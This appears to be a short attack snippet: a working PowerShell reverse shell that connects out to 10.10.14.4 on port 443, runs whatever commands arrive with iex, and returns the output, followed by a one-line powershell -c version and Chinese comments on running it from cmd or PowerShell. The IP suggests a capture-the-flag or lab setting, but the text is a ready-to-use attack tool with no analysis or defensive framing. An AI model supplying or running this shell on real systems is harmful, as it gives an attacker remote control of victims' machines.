$client = New-Object System.Net.Sockets.TCPClient('10.10.14.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
# 使用cmd执行单行命令,powershell -c""
# 使用PS执行多行命令,直接执行如上代码

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);    $sendback = (iex $data 2>&1 | Out-String );    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);   $stream.Write($sendbyte,0,$sendbyte.Length);    $stream.Flush();}"